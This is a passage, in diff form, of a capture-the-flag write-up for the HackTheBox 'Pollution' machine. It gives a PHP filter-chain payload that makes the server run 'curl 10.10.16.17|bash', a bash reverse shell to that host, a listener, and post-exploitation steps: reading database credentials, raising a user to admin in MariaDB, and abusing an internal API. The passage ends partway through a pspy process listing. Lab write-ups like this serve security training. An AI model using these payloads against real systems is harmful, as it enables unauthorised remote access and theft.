TF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp</div>
+  <p>
+    This payload will make the server execute the following command : <code>curl 10.10.16.17|bash</code>. To make it simple, it will get the 
+    <code>index.html</code> page on our webserver and execute it with bash. We simply need to create an index.html file that contains a bash 
+    reverse shell and start a python web server in the same directory :
+  </p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ cat index.html 
+#!/bin/bash
+
+/bin/sh -i &gt;&amp; /dev/tcp/10.10.16.17/4242 0&gt;&amp;1
+                                                              
+┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</div>
+  <p>We also need to start a listener on port 4242 to get the reverse shell :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/Downloads]
+└─$ pwncat -l 4242</div>
+  <p>Now, we can put our filter chain payload in the page parameter and press enter. After this, we can take a look at our webserver :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.228.126 - - [20/May/2023 19:05:23] &quot;GET / HTTP/1.1&quot; 200 -</div>
+  <p>The server successfully executed our payload. Now, let's take a look at our listener :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/Downloads]
+└─$ pwncat -l 4242
+/bin/sh: 0: can&#x27;t access tty; job control turned off
+$ whoami
+www-data</div>
+  <p>Now we have a foothold as <code>www-data</code> on the system.</p>
+  <h1 id="post-exploitation">Post-exploitation</h1>
+  <h2 id="local-reconnaissance">Local enumeration</h2>
+  <p>Looking in <code>/var/www/collect/</code>, we can find a file called <code>config.php</code>. Let's see what's in it :</p>
+  <div class="codeBlock">&lt;?php
+
+
+return [
+    &quot;db&quot; =&gt; [
+        &quot;host&quot; =&gt; &quot;localhost&quot;,
+        &quot;dbname&quot; =&gt; &quot;webapp&quot;,
+        &quot;username&quot; =&gt; &quot;webapp_user&quot;,
+        &quot;password&quot; =&gt; [HIDDEN],
+        &quot;charset&quot; =&gt; &quot;utf8&quot;
+    ],
+];</div>
+  <p>We have the credentials for <a href="https://www.mysql.com/">MySQL</a>. Let's connect to it and see if we can find some useful informations :</p>
+  <div class="codeBlock">www-data@pollution:~$ mysql -u webapp_user -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 491
+Server version: 10.5.15-MariaDB-0+deb11u1 Debian 11
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.
+
+MariaDB [(none)]&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| developers         |
+| forum              |
+| information_schema |
+| mysql              |
+| performance_schema |
+| pollution_api      |
+| webapp             |
++--------------------+
+7 rows in set (0.001 sec)</div>
+  <p>Let's take a look at the <code>pollution_api</code> database :</p>
+  <div class="codeBlock">MariaDB [(none)]&gt; use pollution_api
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [pollution_api]&gt; show tables;
++-------------------------+
+| Tables_in_pollution_api |
++-------------------------+
+| messages                |
+| users                   |
++-------------------------+
+2 rows in set (0.000 sec)</div>
+  <p>Let's see what is in <code>users</code> table :</p>
+  <div class="codeBlock">MariaDB [pollution_api]&gt; select * from users;
++----+----------+----------+------+---------------------+---------------------+
+| id | username | password | role | createdAt           | updatedAt           |
++----+----------+----------+------+---------------------+---------------------+
+|  1 | test     | test     | user | 2023-05-20 18:09:54 | 2023-05-20 18:09:54 |
+|  2 | test2    | test     | user | 2023-05-20 18:27:34 | 2023-05-20 18:27:34 |
++----+----------+----------+------+---------------------+---------------------+</div>
+  <p>
+    This is where the Pollution API users we created from the admin panel are stored. For now, there is nothing more useful to find on 
+    <a href="https://www.mysql.com/fr/">MySQL</a>. Let's move on and enumerate more.
+  </p>
+  <p>
+    Remember, in the proxy history we found earlier, a request was made to <a href="http://127.0.0.1:3000/">http://127.0.0.1:3000/</a> 
+    which seems to be the Pollution API. Let's make a simple GET request with <a href="https://curl.se/">curl</a> :
+  </p>
+<div class="codeBlock">www-data@pollution:~/collect$ curl localhost:3000
+{&quot;Status&quot;:&quot;Ok&quot;,&quot;Message&quot;:&quot;Read documentation from api in /documentation&quot;}</div>
+  <p>So now, we are sure this is how to access the Pollution API. Let’s see the documentation :</p>
+  <div class="codeBlock">www-data@pollution:~/collect$ curl localhost:3000/documentation
+{&quot;Documentation&quot;:{&quot;Routes&quot;:{&quot;/&quot;:{&quot;Methods&quot;:&quot;GET&quot;,&quot;Params&quot;:null},&quot;/auth/register&quot;:{&quot;Methods&quot;:&quot;POST&quot;,&quot;Params&quot;:{&quot;username&quot;:&quot;username&quot;,&quot;password&quot;:&quot;password&quot;}},&quot;/auth/login&quot;:{&quot;Methods&quot;:&quot;POST&quot;,&quot;Params&quot;:{&quot;username&quot;:&quot;username&quot;,&quot;password&quot;:&quot;password&quot;}},&quot;/client&quot;:{&quot;Methods&quot;:&quot;GET&quot;,&quot;Params&quot;:null},&quot;/admin/messages&quot;:{&quot;Methods&quot;:&quot;POST&quot;,&quot;Params&quot;:{&quot;id&quot;:&quot;messageid&quot;}},&quot;/admin/messages/send&quot;:{&quot;Methods&quot;:&quot;POST&quot;,&quot;Params&quot;:{&quot;text&quot;:&quot;message text&quot;}}}}}</div>
+  <p>Let's try to send a request to <code>/admin/messages/send</code> :</p>
+  <div class="codeBlock">www-data@pollution:~$ curl localhost:3000/admin/messages/send
+{&quot;Status&quot;:&quot;Error&quot;,&quot;Message&quot;:&quot;You are not allowed&quot;}</div>
+  <p>We are not allowed to access this endpoint. Let's take a look back at the request that victor sent to the Pollution API :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/HTB/CTF/Hard/Pollution]
+└─$ echo &#x27;UE9TVCAvYXV0aC9sb2dpbiBIVFRQLzEuMQpIb3N0OiAxMjcuMC4wLjE6MzAwMApVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDYuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDYuMApBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgKQWNjZXB0LUxhbmd1YWdlOiBwdC1CUixwdDtxPTAuOCxlbi1VUztxPTAuNSxlbjtxPTAuMwpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUKQ29ubmVjdGlvbjogY2xvc2UKVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQpJZi1Ob25lLU1hdGNoOiBXLyIzMi1VL2RzYUs2bVRRWHJYN0RsWHhDaDVMOFlMRjgiCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkCkNvbnRlbnQtTGVuZ3RoOiAzNwoKeyJ1c2VybmFtZSI6InVzZXIiLCJwYXNzd29yZCI6InBhc3MifQ==&#x27; | base64 -d
+POST /auth/login HTTP/1.1
+Host: 127.0.0.1:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+If-None-Match: W/&quot;32-U/dsaK6mTQXrX7DlXxCh5L8YLF8&quot;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+
+{&quot;username&quot;:&quot;user&quot;,&quot;password&quot;:&quot;pass&quot;}</div>
+  <p>
+    We need to login first. Let's try to login to the Pollution API using the credentials we created on 
+    <code>http://collect.htb/admin</code> earlier :
+  </p>
+  <div class="codeBlock">www-data@pollution:~$ curl -X POST localhost:3000/auth/login -d &#x27;{&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;test&quot;}&#x27;
+{&quot;Status&quot;:&quot;Parameters not found&quot;}</div>
+  <p>Parameters not found… Let's take a look at the forum thread where we found the proxy history :</p>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 18.png"/>
+  <p>We need to add a HTTP header to define the content type to <code>application/json</code> :</p>
+  <div class="codeBlock">www-data@pollution:~$ curl -X POST localhost:3000/auth/login -d &#x27;{&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;test&quot;}&#x27; -H &quot;Content-Type: application/json&quot;
+{&quot;Status&quot;:&quot;Ok&quot;,&quot;Header&quot;:{&quot;x-access-token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjg0NjI5MTc2LCJleHAiOjE2ODQ2MzI3NzZ9.BftvWGrUBoth4ZHN7NqW6dcY4bU_hz1Rdc35l20Wq5g&quot;}}</div>
+  <p>It worked. The Pollution API gave us an access token. Now, let's try to use it to send a request to <code>/admin/messages/send again</code> :</p>
+  <div class="codeBlock">www-data@pollution:~$ curl -X POST localhost:3000/admin/messages/send -H &quot;Content-Type: application/json&quot; -H &quot;x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjg0NjI5MTc2LCJleHAiOjE2ODQ2MzI3NzZ9.BftvWGrUBoth4ZHN7NqW6dcY4bU_hz1Rdc35l20Wq5g&quot;
+{&quot;Status&quot;:&quot;Error&quot;,&quot;Message&quot;:&quot;You are not allowed&quot;}</div>
+  <p>
+    Same error. Maybe because we just have the user role and not the admin role. Let's change this in 
+    <a href="https://www.mysql.com/fr/">MySQL</a> :
+  </p>
+  <div class="codeBlock">www-data@pollution:~$ mysql -u webapp_user -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 506
+Server version: 10.5.15-MariaDB-0+deb11u1 Debian 11
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.
+
+MariaDB [(none)]&gt; use pollution_api
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [pollution_api]&gt; UPDATE users SET role=&quot;admin&quot; WHERE username=&quot;test&quot;;
+Query OK, 1 row affected (0.003 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+MariaDB [pollution_api]&gt; SELECT * FROM users;
++----+----------+----------+-------+---------------------+---------------------+
+| id | username | password | role  | createdAt           | updatedAt           |
++----+----------+----------+-------+---------------------+---------------------+
+|  1 | test     | test     | admin | 2023-05-20 18:09:54 | 2023-05-20 18:09:54 |
+|  2 | test2    | test     | user  | 2023-05-20 18:27:34 | 2023-05-20 18:27:34 |
++----+----------+----------+-------+---------------------+---------------------+
+2 rows in set (0.001 sec)</div>
+  <p>Now let's try again :</p>
+  <div class="codeBlock">www-data@pollution:~$ curl -X POST localhost:3000/admin/messages/send -H &quot;Content-Type: application/json&quot; -H &quot;x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4NDYzMDA5NSwiZXhwIjoxNjg0NjMzNjk1fQ.c2l9iEDpg8gt8LBPHZWCKI6iY9X9YI5vDNBjZ3GbFis&quot;
+{&quot;Status&quot;:&quot;Error&quot;,&quot;Message&quot;:&quot;Parameter text not found&quot;}</div>
+  <p>We need to add a <code>text</code> parameter :</p>
+  <div class="codeBlock">www-data@pollution:~$ curl -X POST localhost:3000/admin/messages/send -H &quot;Content-Type: application/json&quot; -H &quot;x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4NDYzMDA5NSwiZXhwIjoxNjg0NjMzNjk1fQ.c2l9iEDpg8gt8LBPHZWCKI6iY9X9YI5vDNBjZ3GbFis&quot; -d &#x27;{&quot;text&quot;:&quot;test&quot;}&#x27;
+{&quot;Status&quot;:&quot;Ok&quot;}</div>
+  <p>Now it works.</p>
+  <p>
+    We need to enumerate more the system to understand what's running the Pollution API. We can use 
+    <a href="https://github.com/DominicBreuker/pspy">pspy</a> for this. Let's download it on the target system and run it :
+  </p>
+  <div class="codeBlock">www-data@pollution:/tmp/.cb$ ./pspy64
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2023/05/20 21:23:48 CMD: UID=33    PID=5250   | ./pspy64 
+2023/05/20 21:23:48 CMD: UID=0     PID=5110   | 
+2023/05/20 21:23:48 CMD: UID=0     PID=4891   | 
+2023/05/20 21:23:48 CMD: UID=0     PID=4874   | 
+2023/05/20 21:23:48 CMD: UID=0     PID=4722   | 
+2023/05/20 21:23:48 CMD: UID=0     PID=4713   | 
+2023/05/20 21:23:48 CMD: UID=0     PID=4497   | 
+2023/05/20 21:23:48 CMD: UID=0     PID=4379   | 
+2023/05/20 21:23:48 CMD: UID=33    PID=4375   | /bin/bash 
+2023/05/20 21:23:48 CMD: UID=33    PID=4374   | python3 -c import pty; pty.spawn(&quot;/bin/bash&quot;)                               
+2023/05/20 21:23:48 CMD: UID=33    PID=4372   | /bin/sh -i 
+2023/05/20 21:23:48 CMD: UID=33    PID=4371   | bash 
+2023/05/20 21:23:48 CMD: UID=33    PID=4369   | sh -c curl 10.10.16.17|bash                                                 
+2023/05/20 21:23:48 CMD: UID=33    PID=3696   | php-fpm: pool www                                                                                                                         
+2023/05/20 21:23:48 CMD: UID=33    PID=3695   | php-fpm: pool www                                                                                                                         
+2023/05/20 21:23:48 CMD: UID=33    PID=3694   | php-fpm: pool www                                                                                                                         
+2023/05/20 21:23:48 CMD: UID=117   PID=1593   | /usr/libexec/ibus-engine-simple                                             
+2023/05/20 21:23:48 CMD: UID=115   PID=1581   | /usr/libexec/colord                                                         
+2023/05/20 21:23:48 CMD: UID=117   PID=1576   | /usr/libexec/ibus-portal                                                    
+2023/05/20 21:23:48 CMD: UID=117   PID=1566   | /usr/libexec/ibus-x11 --kill-daemon                                         
+2023/05/20 21:23:48 CMD: UID=117   PID=1563   | /usr/libexec/ibus-extension-gtk3                                            
+2023/05/20 21:23:48 CMD: UID=117   PID=1562   | /usr/libexec/ibus-dconf                                                     
+2023/05/20 21:23:48 CMD: UID=117   PID=1554   | ibus-daemon --panel disable -r --xim                                        
+2023/05/20 21:23:48 CMD: UID=117   PID=1511   | /usr/libexec/gsd-printer                                                    
+2023/05/20 21:23:48 CMD: UID=117   PID=1483   | /usr/libexec/gsd-power                                                      
+2023/05/20 21:23:48 CMD: UID=117   PID=1479   | /usr/libexec/gsd-housekeeping                                               
+2023/05/20 21:23:48 CMD: UID=117   PID=1473   | /usr/libexec/gsd-a11y-settings                                              
+2023/05/20 21:23:48 CMD: UID=117   PID=1472   | /usr/libexec/gsd-sound                                                      
+2023/05/20 21:23:48 CMD: UID=117   PID=1471   | /usr/libexec/gsd-screensaver-proxy                                          
+2023/05/20 21:23:48 CMD: UID=117   PID=1468   | /usr/libexec/gsd-media-keys                                                 
+2023/05/20 21:23:48 CMD: UID=117   PID=1467   | /usr/libexec/gsd-datetime                                                   
+2023/05/20 21:23:48 CMD: UID=117   PID=1461   | /usr/libexec/gsd-smartcard                                                  
+2023/05/20 21:23:48 CMD: UID=117   PID=1459   | /usr/libexec/gsd-rfkill                                                     
+2023/05/20 21:23:48 CMD: UID=117   PID=1455   | /usr/libexec/gsd-print-notifications                                        
+2023/05/20 21:23:48 CMD: UID=117   PID=1454   | /usr/libexec/gsd-keyboard                                                   
+2023/05/20 21:23:48 CMD: UID=117   PID=1449   | /usr/libexec/gsd-color                                                      
+2023/05/20 21:23:48 CMD: UID=117   PID=1447   | /usr/libexec/gsd-wacom                                                      
+2023/05/20 21:23:48 CMD: UID=117   PID=1445   | /usr/libexec/gsd-sharing                                                    
+2023/05/20 21:23:48 CMD: UID=117   PID=1444   | /usr/bin/gjs /usr/share/gnome-shell/org.gnome.Shell.Notifications           
+2023/05/20 21:23:48 CMD: UID=117   PID=1443   | /usr/libexec/at-spi2-registryd --use-gnome-session                          
+2023/05/20 21:23:48 CMD: UID=0     PID=1434   | /usr/libexec/packagekitd                                                    
+2023/05/20 21:23:48 CMD: UID=117   PID=1429   | /usr/libexec/xdg-permission-store                                           
+2023/05/20 21:23:48 CMD: UID=117   PID=1407   | /usr/bin/Xwayland :1024 -rootless -noreset -accessx -core -auth /run/user/117/.mutter-Xwaylandauth.UV4041 -listen 4 -listen 5 -displayfd 6 -listen 7                                                    
+2023/05/20 21:23:48 CMD: UID=117   PID=1404   | /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3                              
+2023/05/20 21:23:48 CMD: UID=117   PID=1399   | /usr/libexec/at-spi-bus-launcher                                            
+2023/05/20 21:23:48 CMD: UID=0     PID=1326   | /usr/bin/node /root/pollution_api/index.js                                  
+2023/05/20 21:23:48 CMD: UID=0     PID=1278   | /usr/libexec/upowerd                                                        
+2023/05/20 21:23:48 CMD: UID=117   PID=1270   | /usr/libexec/gvfs-gphoto2-volume-monitor                                    
+2023/05/20 21:23:48 CMD: UID=117   PID=1260   | /usr/libexec/gvfs-afc-volume-monitor                                        
+2023/05/20 21:23:48 CMD: UID=117   PID=1254   | /usr/libexec/gvfs-mtp-volume-monitor                                        
+2023/05/20 21:23:48 CMD: UID=117   PID=1245   | /usr/libexec/goa-identity-service                                           
+2023/05/20 21:23:48 CMD: UID=117   PID=1224   | /usr/bin/gnome-shell                                                        
+2023/05/20 21:23:48 CMD: UID=117   PID=1218   | /usr/libexec/goa-daemon                                                     
+2023/05/20 21:23:48 CMD: UID=117   PID=1209   | /usr/libexec/gvfs-goa-volume-monitor                                        
+2023/05/20 21:23:48 CMD: UID=117   PID=1201   | /usr/libexec/gvfs-udisks2-volume-monitor                                    
+2023/05/20 21:23:48 CMD: UID=117   PID=1194   | /usr/libexec/gvfsd-fuse /run/user/117/gvfs -f                               
+2023/05/20 21:23:48 CMD: UID=117   PID=1165   | /usr/libexec/gvfsd                                                          
+2023/05/20 21:23:48 CMD: UID=117   PID=1160   | /usr/libexec/gnome-session-binary --systemd --autostart /usr/share/gdm/greeter/autostart                                                  
+2023/05/20 21:23:48 CMD: UID=117   PID=1159   | /usr/bin/pipewire-media-session                                             
+2023/05/20 21:23:48 CMD: UID=117   PID=1158   | dbus-daemon --nofork --print-address 4 --session                            
+2023/05/20 21:23:48 CMD: UID=117   PID=1156   | dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart                                                            
+2023/05/20 21:23:48 CMD: UID=108   PID=1137   | /usr/libexec/rtkit-daemon                                                   
+2023/05/20 21:23:48 CMD: UID=117   PID=1135   | /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                 
+2023/05/20 21:23:48 CMD: UID=117   PID=1133   | /usr/libexec/gdm-wayland-session dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart                           
+2023/05/20 21:23:48 CMD: UID=117   PID=1132   | /usr/libexec/tracker-miner-fs                                               
+2023/05/20 21:23:48 CMD: UID=117   PID=1130   | /usr/bin/pulseaudio --daemonize=no --log-target=journal                     
+2023/05/20 21:23:48 CMD: UID=117   PID=1129   | /usr/bin/pipewire                                                           
+2023/05/20 21:23:48 CMD: UID=117   PID=1113   | (sd-pam) 
+2023/05/20 21:23:48 CMD: UID=117   PID=1112   | /lib/systemd/systemd --user                                                 
+2023/05/20 21:23:48 CMD: UID=118   PID=1110   | /usr/sbin/mariadbd                                                          
+2023/05/20 21:23:48 CMD: UID=33    PID=1041   | /usr/sbin/apache2 -k start                                                  
+2023/05/20 21:23:48 CMD: UID=33    PID=1040   | /usr/sbin/apache2 -k start                                                  
+2023/05/20 21:23:48 CMD: UID=0     PID=1033   | /usr/sbin/apache2 -k start                                                  
+2023/05/20 21:23:48 CMD: UID=1002  PID=1031   | php-fpm: pool victor                                                                                                                      
+2023/05/20 21:23:48 CMD: UID=1002  PID=1030   | php-fpm: pool victor                                                                                                                      
+2023/05/20 21:23:48 CMD: UID=0     PID=1014   | gdm-session-worker [pam/gdm-launch-environment]                             
+2023/05/20 21:23:48 CMD: UID=0     PID=988    | /usr/sbin/gdm3                                                              
+2023/05/20 21:23:48 CMD: UID=0     PID=980    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups                     
+2023/05/20 21:23:48 CMD: UID=0     PID=968    | /usr/bin/python3 /usr/bin/supervisord -n -c /etc/supervisor/supervisord.conf                                                              
+2023/05/20 21:23:48 CMD: UID=119   PID=966    | /usr/bin/redis-server 0.0.0.0:6379                                                                                                        
+2023/05/20 21:23:48 CMD: UID=0     PID=965    | php-fpm: master process (/etc/php/8.1/fpm/php-fpm.conf)                                                                                   
+2023/05/20 21:23:48 CMD: UID=0     PID=788    | /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 
+2023/05/20 21:23:48 CMD: UID=0     PID=777    | /usr/sbin/ModemManager                                                      
+2023/05/20 21:23:48 CMD: UID=0     PID=766    | /usr/sbin/cups-browsed                                                      
+2023/05/20 21:23:48 CMD: UID=111   PID=696    | avahi-daemon: chroot helper                                                 
+2023/05/20 21:23:48 CMD: UID=0     PID=690    | /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant                           
+2023/05/20 21:23:48 CMD: UID=0     PID=686    | /usr/libexec/udisks2/udisksd                                                
+2023/05/20 21:23:48 CMD: UID=0     PID=682    | /lib/systemd/systemd-logind                                                 
+2023/05/20 21:23:48 CMD: UID=0     PID=681    | /usr/libexec/switcheroo-control                                             
+2023/05/20 21:23:48 CMD: UID=0     PID=679    | /usr/sbin/rsyslogd -n -iNONE                                                
+2023/05/20 21:23:48 CMD: UID=0     PID=678    | /usr/libexec/polkitd --no-debug                                             
+2023/05/20 21:23:48 CMD: UID=0     PID=672    | /usr/sbin/NetworkManager --no-daemon                                        
+2023/05/20 21:23:48 CMD: UID=104   PID=670    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                  
+2023/05/20 21:23:48 CMD: UID=0     PID=669    | /usr/sbin/cron -f                                                           
+2023/05/20 21:23:48 CMD: UID=111   PID=665    | avahi-daemon: running [pollution.local]                                     
+2023/05/20 21:23:48 CMD: UID=0     PID=661    | /usr/libexec/accounts-daemon                                                
+2023/05/20 21:23:48 CMD: UID=0     PID=652    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=634    | 
+2023/05/20 21:23:48 CMD: UID=997   PID=631    | /usr/local/sbin/laurel --config /etc/laurel/config.toml                     
+2023/05/20 21:23:48 CMD: UID=0     PID=629    | /sbin/auditd 
+2023/05/20 21:23:48 CMD: UID=0     PID=581    | /usr/bin/vmtoolsd                                                           
+2023/05/20 21:23:48 CMD: UID=0     PID=579    | /usr/bin/VGAuthService                                                      
+2023/05/20 21:23:48 CMD: UID=0     PID=577    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=456    | /lib/systemd/systemd-udevd                                                  
+2023/05/20 21:23:48 CMD: UID=0     PID=447    | vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid                               
+2023/05/20 21:23:48 CMD: UID=0     PID=426    | /lib/systemd/systemd-journald                                               
+2023/05/20 21:23:48 CMD: UID=0     PID=389    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=388    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=174    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=173    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=172    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=171    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=170    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=169    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=168    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=167    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=166    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=165    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=164    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=163    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=157    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=156    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=155    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=154    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=153    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=152    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=151    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=106    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=105    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=102    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=93     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=92     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=91     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=90     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=89     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=88     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=87     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=86     | 
